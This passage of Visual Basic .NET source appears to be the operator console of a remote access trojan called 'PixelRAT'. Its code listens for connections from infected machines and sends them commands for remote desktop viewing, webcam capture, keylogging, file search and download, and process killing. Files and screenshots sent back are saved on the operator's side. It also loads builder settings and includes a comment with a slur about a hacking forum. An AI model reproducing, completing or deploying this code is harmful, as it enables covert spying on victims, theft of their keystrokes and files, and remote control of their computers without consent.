        Dim req As HttpWebRequest = WebRequest.Create("http://whatismyip.com/automation/n09230945.asp")
        Dim res As HttpWebResponse = req.GetResponse()
        Dim Stream As Stream = res.GetResponseStream()
        MButton1.PerformLayout()
        Dim sr As StreamReader = New StreamReader(Stream)

        Label1.Text = "Your IP: " & sr.ReadToEnd()
       
        '  MTheme1.Text = "PixelRAT :: No users online"
        Label3.Text = "No users online"
        'ConnectionPanel.Show()
        ListView1.BorderStyle = BorderStyle.None

        PictureBox9.Visible = True
        Me.Focus()
        hidethat("StartupPanel", StartupPanel)

        Dim Settings(), SettingFile As String
        SettingFile = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\Listen.ini")
        Settings = Split(SettingFile, "|")
        TextBox1.Text = Settings(0)
        TextPort.Text = Settings(1)
        TextBox22.Text = Settings(0)
        TextBox23.Text = Settings(1)
        CheckBox7.Checked = Settings(2)

        Dim Settings2(), SettingFile2 As String
        SettingFile2 = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\Build.ini")
        Settings2 = Split(SettingFile2, "|")
        TextBox21.Text = Settings2(0)
        TextBox28.Text = Settings2(1)
        TextBox29.Text = Settings2(2)
        CheckBox13.Checked = Settings2(3)
        CheckBox8.Checked = Settings2(4)
        CheckBox11.Checked = Settings2(5)
        CheckBox2.Checked = Settings2(6)
        CheckBox14.Checked = Settings2(7)
        TextBox30.Text = Settings2(8)

        RichTextBox5.Text = "[" & TimeOfDay & "]" & " Configuration Successful! Welcome to PixelRAT. Waiting for user input..." & vbNewLine
    End Sub

    ' Private Sub Form1_closing(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.FormClosing


    '   Dim pProcess() As Process = System.Diagnostics.Process.GetProcessesByName("RemoteDesktop")
    '  pProcess(0).Kill()
    '  For Each p As Process In pProcess
    ' p.Kill()
    ' Next

    ' End Sub
    Private Sub Form1_close(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.FormClosing

        If islisten = 0 Then
            Try
                Dim req As HttpWebRequest = WebRequest.Create("http://whatismyip.com/automation/n09230945.asp")
                Dim res As HttpWebResponse = req.GetResponse()
                Dim Stream As Stream = res.GetResponseStream()
                Dim sr As StreamReader = New StreamReader(Stream)
                sendback("DISCONNECT|" & sr.ReadToEnd)
            Catch ex As Exception
            End Try
        Else

        End If
    End Sub
    Private Sub Form1_closed(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.FormClosed
        Application.Exit()
    End Sub
    Public Function GetFlag(ByVal country As String)

        Dim cn As Integer

        Select Case country
            Case "afghanistan"
                cn = 0
            Case "albania"
                cn = 1
            Case "algeria"
                cn = 2
            Case "american samoa"
                cn = 3
            Case "andorra"
                cn = 4
            Case "angola"
                cn = 5
            Case "anguilla"
                cn = 6
            Case "antigua and barbuda"
                cn = 7
            Case "argentina"
                cn = 8
            Case "armenia"
                cn = 9
            Case "aruba"
                cn = 10
            Case "australia"
                cn = 11
            Case "austria"
                cn = 12
            Case "azerbaijan"
                cn = 13
            Case "bahamas"
                cn = 14
            Case "bahrain"
                cn = 15
            Case "bangladesh"
                cn = 16
            Case "barbados"
                cn = 17
            Case "belarus"
                cn = 18
            Case "belgium"
                cn = 19
            Case "belize"
                cn = 20
            Case "benin"
                cn = 21
            Case "bermuda"
                cn = 22
            Case "bhutan"
                cn = 23
            Case "bolivia"
                cn = 24
            Case "bosnia"
                cn = 25
            Case "botswana"
                cn = 26
            Case "brazil"
                cn = 27
            Case "british virgin islands"
                cn = 28
            Case "brunei"
                cn = 29
            Case "bulgaria"
                cn = 30
            Case "burkina faso"
                cn = 31
            Case "burundi"
                cn = 32
            Case "cambodia"
                cn = 33
            Case "cameroon"
                cn = 34
            Case "canada"
                cn = 35
            Case "cape verde"
                cn = 36
            Case "cayman islands"
                cn = 37
            Case "central african republic"
                cn = 38
            Case "chad"
                cn = 39
            Case "chile"
                cn = 40
            Case "china"
                cn = 41
            Case "christmas island"
                cn = 42
            Case "colombia"
                cn = 43
            Case "comoros"
                cn = 44
            Case "cook islands"
                cn = 45
            Case "costa rica"
                cn = 46
            Case "croatia"
                cn = 47
            Case "cuba"
                cn = 48
            Case "cyprus northern"
                cn = 49
            Case "cyprus"
                cn = 50
            Case "czech republic"
                cn = 51
            Case "côte d'ivoire"
                cn = 52
            Case "democratic republic of the c ngo"
                cn = 53
            Case "denmark"
                cn = 54
            Case "djibouti"
                cn = 55
            Case "dominica"
                cn = 56
            Case "dominican_republic"
                cn = 57
            Case "ecuador"
                cn = 58
            Case "egypt"
                cn = 59
            Case "el salvador"
                cn = 60
            Case "equatorial guinea"
                cn = 61
            Case "eritrea"
                cn = 62
            Case "estonia"
                cn = 63
            Case "ethiopia"
                cn = 64
            Case "falkland islands"
                'hack forums are leeching fags
                cn = 65
            Case "faroe islands"
                cn = 66
            Case "fiji"
                cn = 67
            Case "finland"
                cn = 68
            Case "france"
                cn = 69
            Case "french polynesia"
                cn = 70
            Case "gabon"
                cn = 71
            Case "gambia"
                cn = 72
            Case "georgia"
                cn = 73
            Case "germany"
                cn = 74
            Case "ghana"
                cn = 75
            Case "gibraltar"
                cn = 76
            Case "greece"
                cn = 77
            Case "greenland"
                cn = 78
            Case "grenada"
                cn = 79
            Case "guam"
                cn = 80
            Case "guatemala"
                cn = 81
            Case "guinea bissau"
                cn = 82
            Case "guinea"
                cn = 83
            Case "guyana"
                cn = 84
            Case "haiti"
                cn = 85
            Case "honduras"
                cn = 86
            Case "hong kong"
                cn = 87
            Case "hungary"
                cn = 88
            Case "iceland"
                cn = 89
            Case "india"
                cn = 90
            Case "indonesia"
                cn = 91
            Case "iran"
                cn = 92
            Case "iraq"
                cn = 93
            Case "ireland"
                cn = 94
                MsgBox("lolwut?")
            Case "israel"
                cn = 95
            Case "italy"
                cn = 96
            Case "jamaica"
                cn = 97
            Case "japan"
                cn = 98
            Case "jordan"
                cn = 99
            Case "kazakhstan"
                cn = 100
            Case "kenya"
                cn = 101
            Case "kiribati"
                cn = 102
            Case "kuwait"
                cn = 103
            Case "kyrgyzstan"
                cn = 104
            Case "laos"
                cn = 105
            Case "latvia"
                cn = 106
            Case "lebanon"
                cn = 107
            Case "lesotho"
                cn = 108
            Case "liberia"
                cn = 109
            Case "libya"
                cn = 110
            Case "liechtenstein"
                cn = 111
            Case "lithuania"
                cn = 112
            Case "luxembourg"
                cn = 113
            Case "macao"
                cn = 114
            Case "macedonia"
                cn = 115
            Case "madagascar"
                cn = 116
            Case "malawi"
                cn = 117
            Case "malaysia"
                cn = 118
            Case "maldives"
                cn = 119
            Case "mali"
                cn = 120
            Case "malta"
                cn = 121
            Case "marshall islands"
                cn = 122
            Case "martinique"
                cn = 123
            Case "mauritania"
                cn = 124
            Case "mauritius"
                cn = 125
            Case "mexico"
                cn = 126
            Case "micronesia"
                cn = 127
            Case "moldova"
                cn = 128
            Case "monaco"
                cn = 129
            Case "mongolia"
                cn = 130
            Case "montserrat"
                cn = 131
            Case "morocco"
                cn = 132
            Case "mozambique"
                cn = 133
            Case "myanmar"
                cn = 134
            Case "namibia"
                cn = 135
            Case "nauru"
                cn = 136
            Case "nepal"
                cn = 137
            Case "netherlands antilles"
                cn = 138
            Case "netherlands"
                cn = 139
            Case "new zealand"
                cn = 140
            Case "nicaragua"
                cn = 141
            Case "niger"
                cn = 142
            Case "nigeria"
                cn = 143
            Case "niue"
                cn = 144
            Case "norfolk island"
                cn = 145
            Case "north korea"
                cn = 146
            Case "norway"
                cn = 147
            Case "oman"
                cn = 148
            Case "pakistan"
                cn = 149
            Case "palau"
                cn = 150
            Case "panama"
                cn = 151
            Case "papua new guinea"
                cn = 152
            Case "paraguay"
                cn = 153
            Case "peru"
                cn = 154
            Case "philippines"
                cn = 155
            Case "pitcairn islands"
                cn = 156
            Case "poland"
                cn = 157
            Case "portugal"
                cn = 158
            Case "puerto rico"
                cn = 159
            Case "qatar"
                cn = 160
            Case "republic of the congo"
                cn = 161
            Case "romania"
                cn = 162
            Case "russian federation"
                cn = 163
            Case "rwanda"
                cn = 164
            Case "saint kitts and nevis"
                cn = 165
            Case "saint lucia"
                cn = 166
            Case "saint pierre"
                cn = 167
            Case "saint vicent and the grenadines"
                cn = 168
            Case "samoa"
                cn = 169
            Case "san marino"
                cn = 170
            Case "sao tomé and príncipe"
                cn = 171
            Case "saudi arabia"
                cn = 172
            Case "senegal"
                cn = 173
            Case "serbia and montenegro"
                cn = 174
            Case "seychelles"
                cn = 175
            Case "sierra leone"
                cn = 176
            Case "singapore"
                cn = 177
            Case "slovakia"
                cn = 178
            Case "slovenia"
                cn = 179
            Case "soloman islands"
                cn = 180
            Case "somalia"
                cn = 181
            Case "south africa"
                cn = 182
            Case "south georgia"
                cn = 183
            Case "south korea"
                cn = 184
            Case "soviet union"
                cn = 185
            Case "spain"
                cn = 186
            Case "sri lanka"
                cn = 187
            Case "sudan"
                cn = 188
            Case "suriname"
                cn = 189
            Case "swaziland"
                cn = 190
            Case "sweden"
                cn = 191
            Case "switzerland"
                cn = 192
            Case "syria"
                cn = 193
            Case "taiwan"
                cn = 194
            Case "tajikistan"
                cn = 195
            Case "tanzania"
                cn = 196
            Case "thailand"
                cn = 197
            Case "tibet"
                cn = 198
            Case "timor-leste"
                cn = 199
            Case "togo"
                cn = 200
            Case "tonga"
                cn = 201
            Case "trinidad_and_tobago"
                cn = 202
            Case "tunisia"
                cn = 203
            Case "turkey"
                cn = 204
            Case "turkmenistan"
                cn = 205
            Case "turks_and_caicos_islands"
                cn = 206
            Case "tuvalu"
                cn = 207
            Case "uae"
                cn = 208
            Case "uganda"
                cn = 209
            Case "ukraine"
                cn = 210
            Case "united kingdom"
                cn = 211
            Case "united states"
                cn = 212
            Case "united states of america"
                cn = 212
            Case "uruguay"
                cn = 213
            Case "us virgin islands"
                cn = 214
            Case "uzbekistan"
                cn = 215
            Case "vanuatu"
                cn = 216
            Case "vatican city"
                cn = 217
            Case "venezuela"
                cn = 218
            Case "vietnam"
                cn = 219
            Case "wallis and futuna"
                cn = 220
            Case "yemen"
                cn = 221
            Case "zambia"
                cn = 222
            Case "zimbabwe"
                cn = 223

        End Select

        Return cn

    End Function

    Private Sub ListenSub()

        Dim server As New TcpListener(IPAddress.Any, TextBox1.Text)
        server.Start()


        Try
            While True


                Dim c As TcpClient = server.AcceptTcpClient
                Dim s As NetworkStream = c.GetStream


                If isdesktop = 0 Then


                    FileOpen(1, savefilepath, OpenMode.Binary)
                    Dim buffer(1024 - 1) As Byte
                    MProgress1.Current = 40
                    Do While True
                        Dim bytesRead As Integer = s.Read(buffer, 0, buffer.Length)
                        If bytesRead = 0 Then Exit Do
                        FilePut(1, buffer)
                        MProgress1.Current += 5
                    Loop
                    MProgress1.Current = 100
                    FileClose(1)

                    RichTextBox5.Text += "[" & TimeOfDay & "]" & THEFILE & " has been recieved and saved in the directory: " & savefilepath & vbNewLine
                    RichTextBox5.SelectionStart = RichTextBox5.TextLength
                    RichTextBox5.ScrollToCaret()

                    MProgress1.Current = 0
                Else
                    FileOpen(1, Application.StartupPath & "/thepic.jpg", OpenMode.Binary)
                    Dim buffer(1) As Byte
                    Do While True
                        Dim bytesRead As Integer = s.Read(buffer, 0, buffer.Length)
                        If bytesRead = 0 Then Exit Do
                        FilePut(1, buffer)
                    Loop
                End If

                FileClose(1)

                s.Close()
                c.Close()

                Try
                    PictureBox1.Load(Application.StartupPath & "/thepic.jpg")
                Catch ex As Exception
                End Try 'thnks coron



            End While
        Catch ex As Exception
            ' MsgBox("Error encountered (server):" & vbCr & ex.ToString, MsgBoxStyle.Critical, "Error")
            server.Stop()
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Error occured in receiving image/file" & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()
            isdesktop = 0
            isdesktop = 5
            alreadyd = 0
            server.Stop()
            '   server.Start()
        End Try
last:


    End Sub 'listen for pic

    'pic sender

    Private Sub Timer7_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer7.Tick
        If PictureBox1.Image Is Nothing Then

        Else





            If MButtonnone42.Text = "Small Window" Then
                Form8.PictureBox1.Image = PictureBox1.Image
                PictureBox1.Image = Nothing
            Else

                PictureBox2.Image = PictureBox1.Image
                PictureBox1.Image = Nothing
            End If
        End If
    End Sub 'remove image if in use in picturebox1

    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        If CheckBox1.Checked = True Then

            If islisten = 0 Then
            Else

                Try
                    Plague("CLICK|" & Label6.Text & "|" & id & "|" & PictureBox2.Width & "|" & PictureBox2.Height)
                Catch ex As Exception
                End Try
            End If
        End If
    End Sub


    Private Sub PictureBox2_move(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.MouseMove
        LocalMousePosition = PictureBox2.PointToClient(Cursor.Position)


        Label6.Text = (LocalMousePosition.X & "," & LocalMousePosition.Y)

    End Sub

    Private Sub ViewWebcamToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ViewWebcamToolStripMenuItem.Click




        hidethat("RemoteDesktopPanel", RemoteDesktopPanel)
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next
        isdesktop = 1
        Timer7.Start()
        If alreadyd = 0 Then
            System.Threading.Thread.Sleep(1000)
            Dim ListenThread As System.Threading.Thread = New System.Threading.Thread(AddressOf ListenSub) 'Create a thread
            ListenThread.IsBackground = True 'Set the thread to run in background
            ListenThread.Start() 'Start the thread. We are making a thread so it won't interact with our interface
            alreadyd = 1
        Else

        End If
        If islisten = 0 Then
        Else


            Try
                Plague("WEBCAM|START|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Starting webcam viewer..." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed, please try again." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
        End If
    End Sub
    Private Sub RemoteDesktopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteDesktopToolStripMenuItem.Click

        CheckBox1.Visible = True


        isdesktop = 1
        hidethat("RemoteDesktopPanel", RemoteDesktopPanel)

        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget

            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget

        Next
        isdesktop = 1
        Timer7.Start()

        If alreadyd = 0 Then
            System.Threading.Thread.Sleep(1000)
            Dim ListenThread As System.Threading.Thread = New System.Threading.Thread(AddressOf ListenSub) 'Create a thread
            ListenThread.IsBackground = True 'Set the thread to run in background
            ListenThread.Start() 'Start the thread. We are making a thread so it won't interact with our interface
            alreadyd = 1
        Else

        End If

        If islisten = 0 Then
        Else

            Try
                Plague("REMOTE|START|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Starting remote desktop..." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command sending failed. Please try again." & id & vbNewLine

                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
        End If
    End Sub



    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        If desktop = 2 Then


            desktop = 5
            Timer2.Stop()



        End If
    End Sub







    Private Sub CheckToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckToolStripMenuItem.Click


    End Sub






    Private Sub CheckToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next

    End Sub

    Private Sub RemoveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each item As ListViewItem In ListView1.SelectedItems

            item.Remove()
        Next
    End Sub






    Public Function FileNameWithoutExtension(ByVal FullPath As String) As String

        Return System.IO.Path.GetFileNameWithoutExtension(FullPath)


    End Function

    Private Sub MButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton4.Click
        On Error Resume Next
        Dim OutText As String = ""
        For Each S As ListViewItem In ListView1.Items
            OutText &= listitem(S.SubItems(0).ToString) & "|" & listitem(S.SubItems(1).ToString) & "|" & listitem(S.SubItems(2).ToString) & "|" & listitem(S.SubItems(3).ToString) & "|" & listitem(S.SubItems(4).ToString) & "|" & listitem(S.SubItems(5).ToString) & "|" & listitem(S.SubItems(6).ToString) & "|" & listitem(S.SubItems(7).ToString) & vbNewLine
        Next


        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "/connections.dat", OutText, False)

        Plague("GOING")

        End

        ' Application.Exit()
    End Sub


    Private Sub MButtonnone1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone1.Click




        Me.Height = 522
        Me.Width = 710
        If islisten = 0 Then



        Else

            Try
                Plague("DISCONNECT|ALL")
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Disconnecting all..." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
                MTheme1.Text = "PixelRAT :: No users online"
                Label3.Text = "No users online"
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command Failed" & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try

            Try
                listener.Stop()
            Catch ex As Exception
            End Try
        End If

        Icount = 0
        ListView1.Clear()
        hidethat("ConnectionPanel", ConnectionPanel)



    End Sub

    Private Sub MButton13_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)


    End Sub


    Private Sub MTheme1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub MButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton1.Click
        On Error Resume Next
        Form8.Hide()
        If BackgroundWorker2.IsBusy Then : System.Threading.Thread.Sleep(3000) : End If
        BackgroundWorker2.RunWorkerAsync()
        Me.Height = 522
        Me.Width = 710

        ListView3.Items.Clear()
        hidethat("ConnectionPanel", ConnectionPanel)

    End Sub
    Private Sub PictureBox2_move(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox2.MouseMove

    End Sub

    Private Sub MButtonnone3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone3.Click
        PictureBox9.Visible = True
        Me.Height = 522
        Me.Width = 710

        Dim FIRSTTIME As String = System.Configuration.ConfigurationSettings.AppSettings("FIRSTTIME")
        If FIRSTTIME = "NO" Then
            If TextPort.Text = "" Then
            Else
                MsgBox("Starting listener with user-defined settings")
                ' TextBox1.Enabled = False
                '    btnListen.Enabled = False 'Disable clicking of this button.

                listenerThread = New Threading.Thread(AddressOf DoListen)
                listenerThread.Start()
                islisten = 1
                MButtonnone3.Enabled = False
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Listening on Ports " & TextBox1.Text & " and " & TextPort.Text & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()


                hidethat("StartupPanel", StartupPanel)

                MButtonnone3.Enabled = False
            End If
            '

        Else
            hidethat("StartupPanel", StartupPanel)
            'hidethat("settingspanel", settingspanel)
        End If

        Timer16.Start()


    End Sub





    Private Sub MTheme1_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MTheme1.Click

    End Sub



    Private Sub MButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton2.Click
        PictureBox9.Visible = False
        Me.Height = 351
        Me.Width = 710
        hidethat("settingspanel", settingspanel)

        'thepanel.Show()


    End Sub
    Public Function hidethat(ByVal panelname As String, ByVal thepanel As Panel)
        thepanel.Show()

        For Each control As Control In Me.Controls
            ' MsgBox(control.ToString)
            If control.ToString.Contains("System.Windows.Forms.Panel") Then
                If control.Name = panelname Then

                Else
                    control.Hide()
                End If

            End If
        Next

    End Function

    'REMOVE THISSSSSSSSSSSSSSSSSSSSSS


    Private Sub MButton9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)


        Try
            Plague("REMOTE|STOP|" & id)
        Catch ex As Exception
        End Try


        filemanagerpanel.Show()

        hidethat("filemanagerpanel", filemanagerpanel)


    End Sub

    Private Sub MButtonnone4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone4.Click
        If MButtonnone4.Text = "Search For File" Then

            For Each item As ListViewItem In ListView2.Items
                item.Remove()
            Next

            Try

                Plague("FILESEARCH|" & id & "|" & TextBox2.Text & "|" & ComboBox1.SelectedText)
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Starting file search..." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed. Please try again." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
            MButtonnone4.Text = "Stop Search"

        Else
            Try
                Plague("FILESEARCH|" & id & "|" & "STOP")
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Stopping file search..." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            Catch ex As Exception
                RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed. Please try again." & vbNewLine
                RichTextBox5.SelectionStart = RichTextBox5.TextLength
                RichTextBox5.ScrollToCaret()
            End Try
            MButtonnone4.Text = "Search For File"
        End If
    End Sub

    Private Sub FileSearchToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileSearchToolStripMenuItem.Click
        isdesktop = 0


        filemanagerpanel.Show()
        hidethat("filemanagerpanel", filemanagerpanel)
        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = id
        Next

    End Sub

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
        isdesktop = 0
        Try
            Plague("WEBCAM|STOP|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
            '   alreadyd = 0
            isdesktop = 0
        Catch ex As Exception

        End Try

        Try
            Plague("REMOTE|STOP|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
            ' alreadyd = 0
            isdesktop = 0
        Catch ex As Exception

        End Try
        System.Threading.Thread.Sleep(1000)




        If alreadyd = 0 Then
            System.Threading.Thread.Sleep(1000)
            Dim ListenThread As System.Threading.Thread = New System.Threading.Thread(AddressOf ListenSub) 'Create a thread
            ListenThread.IsBackground = True 'Set the thread to run in background
            ListenThread.Start() 'Start the thread. We are making a thread so it won't interact with our interface
            alreadyd = 1
        Else
        End If

        For Each item As ListViewItem In ListView2.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(2).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            Dim file As String
            file = dnsget

            Dim dnsget2 As String
            dnsget2 = item.SubItems(0).ToString()

            Dim dataarray4 As String()

            dataarray4 = dnsget2.Split("{")
            dnsget2 = dataarray4(1)
            Dim dataarray5 As String()

            dataarray5 = dnsget2.Split("}")
            dnsget2 = dataarray5(0)
            THEFILE = dnsget2
            ' MsgBox(THEFILE)
            Dim saveFileDialog1 As New SaveFileDialog()

            saveFileDialog1.Filter = "All files|*.*"
            saveFileDialog1.FilterIndex = 2
            saveFileDialog1.RestoreDirectory = True
            saveFileDialog1.Title = "Choose where you want to download the file to"
            saveFileDialog1.FileName = THEFILE
            If saveFileDialog1.ShowDialog() = DialogResult.OK Then

                savefilepath = saveFileDialog1.FileName
                Try
                    MProgress1.Current = 20
                    Plague("DOWNLOAD|" & id & "|" & file)
                Catch ex As Exception
                End Try
            End If


        Next
        MProgress1.Current = 40
    End Sub

    Private Sub KeylogToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeylogToolStripMenuItem.Click

        KeyLoggerPanel.Show()
        hidethat("KeyLoggerPanel", KeyLoggerPanel)
        
    End Sub

    Private Sub Timer11_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer11.Tick

        '    If TextBox5.MaxLength = 200 Then
        Try
            sendback("LOGS|" & TextBox5.Text)
            TextBox5.Clear()
        Catch ex As Exception
        End Try

        '  End If
    End Sub
    Private Sub Timer5_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer5.Tick
        If iskeylog = "yes" Then
            Timer10.Start()
            Timer11.Start()
            iskeylog = "no"


        End If
        If iskeylog = "stop" Then
            Timer10.Stop()
            Timer11.Stop()
            iskeylog = "no"



        End If
    End Sub 'for keylogger

    Private Sub MButtonnone6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone6.Click
        On Error Resume Next
        My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\Log.txt")

        If islisten = 1 Then

            For Each item As ListViewItem In ListView1.SelectedItems
                Dim dnsget As String
                dnsget = item.SubItems(3).ToString()

                Dim dataarray As String()

                dataarray = dnsget.Split("{")
                dnsget = dataarray(1)
                Dim dataarray2 As String()

                dataarray2 = dnsget.Split("}")
                dnsget = dataarray2(0)
                id = dnsget
                COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
            Next

            Plague("KEYLOGGER|" & id & "|" & "START")
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Starting keylogger..." & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()

            Threading.Thread.Sleep(4000)
            RichTextBox1.Text = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\Log.txt")
        End If
    End Sub

    Private Sub MButtonnone7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone7.Click
        RichTextBox1.Clear()
    End Sub

    Private Sub MButtonnone8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone8.Click
        Dim saveFileDialog2 As New SaveFileDialog()

        saveFileDialog2.Filter = "Text Files (*.txt)|*.txt"
        saveFileDialog2.FilterIndex = 2
        saveFileDialog2.RestoreDirectory = True
        saveFileDialog2.Title = "Choose directory to save the logs in"
        saveFileDialog2.FileName = "PixelLog " & id & "|" & Date.Today.ToString

        If saveFileDialog2.ShowDialog() = DialogResult.OK Then

            Dim OutText As String = RichTextBox1.Text

            My.Computer.FileSystem.WriteAllText(saveFileDialog2.FileName, OutText, False)
        End If


    End Sub




    Private Sub ProcessManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click

        For Each item As ListViewItem In ListView1.SelectedItems
            Dim dnsget As String
            dnsget = item.SubItems(3).ToString()

            Dim dataarray As String()

            dataarray = dnsget.Split("{")
            dnsget = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = dnsget.Split("}")
            dnsget = dataarray2(0)
            id = dnsget
            COdSkicmIdkPhgathsyfWfxaNhgdlk = dnsget
        Next
        ProcessPanel.Show()
        hidethat("ProcessPanel", ProcessPanel)
        Try
            Plague("GETPROC|" & COdSkicmIdkPhgathsyfWfxaNhgdlk)
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Gathering processes...Please do not use any other functions till this has finished." & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()
        Catch ex As Exception
            RichTextBox5.Text += "[" & TimeOfDay & "]" & " Command failed. Please try again." & vbNewLine
            RichTextBox5.SelectionStart = RichTextBox5.TextLength
            RichTextBox5.ScrollToCaret()
        End Try

    End Sub

    Private Sub KillProcessToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KillProcessToolStripMenuItem.Click
        For Each item As ListViewItem In ListView3.SelectedItems
            Dim proc As String
            proc = item.SubItems(0).ToString()

            Dim dataarray As String()

            dataarray = proc.Split("{")
            proc = dataarray(1)
            Dim dataarray2 As String()

            dataarray2 = proc.Split("}")
            proc = dataarray2(0)
            Try
